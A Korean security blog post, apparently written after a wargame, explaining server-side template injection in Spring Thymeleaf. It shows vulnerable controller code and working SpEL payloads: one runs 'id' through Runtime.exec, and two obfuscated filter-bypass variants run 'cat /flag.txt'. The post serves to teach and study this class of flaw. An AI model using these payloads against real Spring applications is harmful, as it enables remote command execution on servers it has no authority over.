<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Spring SSTI Wargame 풀이 중 Spring에서 사용하는 Thymeleaf에서 SSTI 취약점이 발생하는 것을 보고 정리했습니다. Thymeleaf? Thymeleaf는 XML/XHTML/HTML5 구문을 기반으로 하는'><title>Spring Thymeleaf SSTI</title>

<link rel='canonical' href='https://appealso.github.io/p/spring-thymeleaf-ssti/'>

<link rel="stylesheet" href="/scss/style.min.775dbd4fd34fda61c5273b4bc3415f7c9666414fb6c40aab164a7ded4397da98.css">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-J2H7Y6XC3K"></script>
<meta name="naver-site-verification" content="66737462d26ac026782cf58694d2b5efcf6ed19f" />
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-J2H7Y6XC3K');
</script><meta property='og:title' content='Spring Thymeleaf SSTI'>
<meta property='og:description' content='Spring SSTI Wargame 풀이 중 Spring에서 사용하는 Thymeleaf에서 SSTI 취약점이 발생하는 것을 보고 정리했습니다. Thymeleaf? Thymeleaf는 XML/XHTML/HTML5 구문을 기반으로 하는'>
<meta property='og:url' content='https://appealso.github.io/p/spring-thymeleaf-ssti/'>
<meta property='og:site_name' content='SooHo&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Web Hacking' /><meta property='article:tag' content='SSTI' /><meta property='article:tag' content='Spring' /><meta property='article:published_time' content='2023-09-09T21:26:12&#43;09:00'/><meta property='article:modified_time' content='2023-09-09T21:26:12&#43;09:00'/><meta property='og:image' content='https://appealso.github.io/p/spring-thymeleaf-ssti/security.jpg' />
<meta name="twitter:title" content="Spring Thymeleaf SSTI">
<meta name="twitter:description" content="Spring SSTI Wargame 풀이 중 Spring에서 사용하는 Thymeleaf에서 SSTI 취약점이 발생하는 것을 보고 정리했습니다. Thymeleaf? Thymeleaf는 XML/XHTML/HTML5 구문을 기반으로 하는"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://appealso.github.io/p/spring-thymeleaf-ssti/security.jpg' />
<script async src="https://www.googletagmanager.com/gtag/js?id=G-J2H7Y6XC3K"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-J2H7Y6XC3K', { 'anonymize_ip': false });
}
</script>

    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "light");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>Back</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/spring-thymeleaf-ssti/">
                <img src="/p/spring-thymeleaf-ssti/security_hua86146557b2012f829fdc26a39bf75dc_509252_800x0_resize_q75_box.jpg"
                        srcset="/p/spring-thymeleaf-ssti/security_hua86146557b2012f829fdc26a39bf75dc_509252_800x0_resize_q75_box.jpg 800w, /p/spring-thymeleaf-ssti/security_hua86146557b2012f829fdc26a39bf75dc_509252_1600x0_resize_q75_box.jpg 1600w"
                        width="800" 
                        height="533" 
                        loading="lazy"
                        alt="Featured image of post Spring Thymeleaf SSTI" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/security/" style="background-color: #2a9d8f; color: #fff;">
                Security
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/p/spring-thymeleaf-ssti/">Spring Thymeleaf SSTI</a>
    </h2>

    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Sep 09, 2023</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    2 minute read
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    <h1 id="spring-ssti">Spring SSTI</h1>
<p>Wargame 풀이 중 Spring에서 사용하는 Thymeleaf에서 SSTI 취약점이 발생하는 것을 보고 정리했습니다.</p>
<h2 id="thymeleaf">Thymeleaf?</h2>
<p>Thymeleaf는 XML/XHTML/HTML5 구문을 기반으로 하는 Java용 최신 서버측 템플릿 엔진입니다. 이는 Thymeleaf HTML 템플릿이 HTML과 똑같이 보이고 작동한다는 것을 의미합니다. 이는 주로 HTML 태그에 추가 속성을 사용하여 달성됩니다. 공식적인 예는 다음과 같습니다.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">table</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">thead</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">th</span> <span class="na">th:text</span><span class="o">=</span><span class="s">&#34;#{msgs.headers.name}&#34;</span><span class="p">&gt;</span>Name<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">th</span> <span class="na">th:text</span><span class="o">=</span><span class="s">&#34;#{msgs.headers.price}&#34;</span><span class="p">&gt;</span>Price<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">thead</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">tbody</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">tr</span> <span class="na">th:each</span><span class="o">=</span><span class="s">&#34;prod: ${allProducts}&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">td</span> <span class="na">th:text</span><span class="o">=</span><span class="s">&#34;${prod.name}&#34;</span><span class="p">&gt;</span>Oranges<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">td</span> <span class="na">th:text</span><span class="o">=</span><span class="s">&#34;${#numbers.formatDecimal(prod.price, 1, 2)}&#34;</span><span class="p">&gt;</span>0.99<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">tbody</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
</code></pre></div><h2 id="ssti">SSTI?</h2>
<p>SSTI(Server-Side Template Injection)은 공격자가 Template 코드를 삽입하여 원하는 행동을 수행하도록 하는 공격입니다.
이 때 Template Injection이 발생하는 위치가 server-side인 경우 SSTI라고 부릅니다. SSTI가 발생하는 경우 Server-Side의 렌더링에 관여할 수 있기 때문에 RCE,SSRF 등으로 연결할 수 있어서 리스크가 높습니다.</p>
<h2 id="thymleaf-ssti">Thymleaf SSTI</h2>
<p>Thymeleaf에서 SSTI를 시도하려면 먼저 Thymeleaf 속성에 나타나는 표현식을 이해해야 합니다. Thymeleaf 표현식은 다음 유형을 가질 수 있습니다:</p>
<ul>
<li>${&hellip;}: 변수 표현식 - 실제로는 OGNL 또는 Spring EL 표현식입니다.</li>
<li>*{&hellip;}: 선택 표현식 – 변수 표현식과 유사하지만 특정 목적으로 사용됩니다.</li>
<li>#{&hellip;}: 메시지(i18n) 표현식 – 국제화에 사용됩니다.</li>
<li>@{&hellip;}: 링크(URL) 표현식 – 애플리케이션에서 올바른 URL/경로를 설정하는 데 사용됩니다.</li>
<li>~{&hellip;}: 조각 표현식 - 템플릿의 일부를 재사용할 수 있게 해줍니다.</li>
</ul>
<p>시도된 SSTI에 대한 가장 중요한 표현식 유형은 첫 번째 유형인 변수 표현식입니다. 웹 애플리케이션이 Spring을 기반으로 하는 경우 Thymeleaf는 Spring EL을 사용합니다. 그렇지 않은 경우 Thymeleaf는 OGNL을 사용합니다. SSTI의 일반적인 테스트 표현식은 입니다 ${7*7}. 이 표현은 Thymeleaf에서도 작동합니다.</p>
<h2 id="thymeleaf-예제">Thymeleaf 예제</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="nd">@GetMapping</span><span class="o">(</span><span class="s">&#34;/path&#34;</span><span class="o">)</span>
<span class="kd">public</span> <span class="n">String</span> <span class="nf">path</span><span class="o">(</span><span class="nd">@RequestParam</span> <span class="n">String</span> <span class="n">lang</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="s">&#34;user/&#34;</span> <span class="o">+</span> <span class="n">lang</span> <span class="o">+</span> <span class="s">&#34;/welcome&#34;</span><span class="o">;</span> <span class="c1">//template path is tainted
</span><span class="c1"></span><span class="o">}</span>

<span class="nd">@GetMapping</span><span class="o">(</span><span class="s">&#34;/fragment&#34;</span><span class="o">)</span>
<span class="kd">public</span> <span class="n">String</span> <span class="nf">fragment</span><span class="o">(</span><span class="nd">@RequestParam</span> <span class="n">String</span> <span class="n">section</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="s">&#34;welcome :: &#34;</span> <span class="o">+</span> <span class="n">section</span><span class="o">;</span> <span class="c1">//fragment is tainted
</span><span class="c1"></span><span class="o">}</span>
</code></pre></div><p>첫 번째 경우(/path)에서는 Path Travasal 같은 취약점이 발생할 수있지만 SSTI만 다루겠습니다.<br>
일반 적인 사용자는 서버의 &lsquo;template&rsquo; 폴더로 제한되며 그 외부의 파일은 볼 수 없습니다.</p>
<p>하지만 파일 시스템에서 템플릿을 로드하기 전에 Spring ThymeleafView 클래스는 템플릿 이름을 표현식으로 구문 분석합니다. 이를 활용하면 표현식 언어 삽입을 통해 공격에 활용할 수 있습니다. <strong>${명령어}</strong>::.x 를 사용하면 접미사가 무엇이든 관계없이 thymeleaf에 의해 실행되도록 할 수 있습니다.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="c1">// /path에 대한 공격(url로 인코딩되어야 함)
</span><span class="c1"></span><span class="n">GET</span> <span class="o">/</span><span class="n">path</span><span class="o">?</span><span class="n">lang</span><span class="o">=</span><span class="n">__$</span><span class="o">{</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;id&#34;</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}</span><span class="n">__</span><span class="o">::.</span><span class="na">x</span> <span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="o">.</span><span class="na">1</span>

<span class="o">=&gt;</span> <span class="n">id</span> <span class="n">값</span> <span class="n">출력</span>
</code></pre></div><h2 id="bypass-filter">Bypass filter</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">$</span><span class="o">{</span><span class="kc">true</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="err">&#39;</span><span class="n">ja</span><span class="err">&#39;</span><span class="o">.</span><span class="na">concat</span><span class="o">(</span><span class="err">&#39;</span><span class="n">va</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="err">&#39;</span><span class="o">)).</span><span class="na">getConstructor</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="err">&#39;</span><span class="n">ja</span><span class="err">&#39;</span><span class="o">.</span><span class="na">concat</span><span class="o">(</span><span class="err">&#39;</span><span class="n">va</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">InputStream</span><span class="err">&#39;</span><span class="o">))).</span><span class="na">newInstance</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="err">&#39;</span><span class="n">ja</span><span class="err">&#39;</span><span class="o">.</span><span class="na">concat</span><span class="o">(</span><span class="err">&#39;</span><span class="n">va</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Run</span><span class="err">&#39;</span><span class="o">).</span><span class="na">concat</span><span class="o">(</span><span class="err">&#39;</span><span class="n">time</span><span class="err">&#39;</span><span class="o">)).</span><span class="na">getMethods</span><span class="o">()[</span><span class="n">6</span><span class="o">].</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">).</span><span class="na">exec</span><span class="o">(</span><span class="err">&#39;</span><span class="n">cat</span><span class="err">&#39;</span><span class="o">.</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">32</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="na">txt</span><span class="err">&#39;</span><span class="o">)).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}::.</span><span class="na">x</span>
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">$</span><span class="o">{</span><span class="kc">true</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="err">&#39;</span><span class="n">ja</span><span class="err">&#39;</span><span class="o">.</span><span class="na">concat</span><span class="o">(</span><span class="err">&#39;</span><span class="n">va</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="err">&#39;</span><span class="o">)).</span><span class="na">getConstructor</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="err">&#39;</span><span class="n">ja</span><span class="err">&#39;</span><span class="o">.</span><span class="na">concat</span><span class="o">(</span><span class="err">&#39;</span><span class="n">va</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">InputStream</span><span class="err">&#39;</span><span class="o">))).</span><span class="na">newInstance</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">106</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">().</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">97</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">118</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">97</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">46</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">108</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">97</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">110</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">103</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">46</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">82</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">117</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">110</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">116</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">105</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">109</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">101</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">())).</span><span class="na">getMethods</span><span class="o">()[</span><span class="n">6</span><span class="o">].</span><span class="na">invoke</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">106</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">().</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">97</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">118</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">97</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">46</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">108</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">97</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">110</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">103</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">46</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">82</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">117</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">110</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">116</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">105</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">109</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">101</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()))).</span><span class="na">exec</span><span class="o">(</span><span class="err">&#39;</span><span class="n">cat</span><span class="err">&#39;</span><span class="o">.</span><span class="na">concat</span><span class="o">(</span><span class="kc">true</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">charAt</span><span class="o">(</span><span class="n">0</span><span class="o">).</span><span class="na">toChars</span><span class="o">(</span><span class="n">32</span><span class="o">)[</span><span class="n">0</span><span class="o">].</span><span class="na">toString</span><span class="o">()).</span><span class="na">concat</span><span class="o">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="na">txt</span><span class="err">&#39;</span><span class="o">)).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}::.</span><span class="na">x</span>
</code></pre></div><h2 id="참고">참고</h2>
<p><a class="link" href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/"  target="_blank" rel="noopener"
    >https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/</a><br>
<a class="link" href="https://github.com/veracode-research/spring-view-manipulation"  target="_blank" rel="noopener"
    >https://github.com/veracode-research/spring-view-manipulation</a></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/web-hacking/">Web Hacking</a>
        
            <a href="/tags/ssti/">SSTI</a>
        
            <a href="/tags/spring/">Spring</a>
        
    </section>


    </footer>


    
</article>

    

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="has-image">
    <a href="/p/prototype-pollution-%EC%B7%A8%EC%95%BD%EC%A0%90/">
        
        
            <div class="article-image">
